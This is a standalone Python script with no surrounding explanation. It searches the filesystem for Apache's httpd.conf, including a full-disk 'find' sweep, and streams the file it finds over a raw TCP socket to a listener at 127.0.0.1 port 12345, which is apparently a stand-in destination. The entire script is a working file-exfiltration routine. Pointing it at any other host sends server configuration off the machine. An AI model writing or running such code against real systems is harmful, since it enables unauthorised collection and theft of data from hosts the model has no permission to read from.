#!/usr/bin/env python3
import os
import socket
import subprocess

def find_httpd_conf():
    common_paths = [
        '/etc/apache2/httpd.conf',
        '/etc/httpd/conf/httpd.conf',
        '/usr/local/apache2/conf/httpd.conf',
        '/etc/apache2/apache2.conf'
    ]
    for path in common_paths:
        if os.path.exists(path):
            return path
    try:
        result = subprocess.run(['find', '/', '-name', 'httpd.conf', '-type', 'f', '-readable'], capture_output=True, text=True, timeout=30)
        if result.stdout.strip():
            return result.stdout.strip().split('\n')[0]
    except subprocess.TimeoutExpired:
        pass
    return None

def send_file_via_tcp(file_path, host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            with open(file_path, 'rb') as f:
                while True:
                    data = f.read(1024)
                    if not data:
                        break
                    s.sendall(data)
    except Exception as e:
        print(f"Error sending file: {e}")

if __name__ == "__main__":
    conf_path = find_httpd_conf()
    if conf_path:
        print(f"Found httpd.conf at: {conf_path}")
        send_file_via_tcp(conf_path, '127.0.0.1', 12345)
    else:
        print("httpd.conf not found")

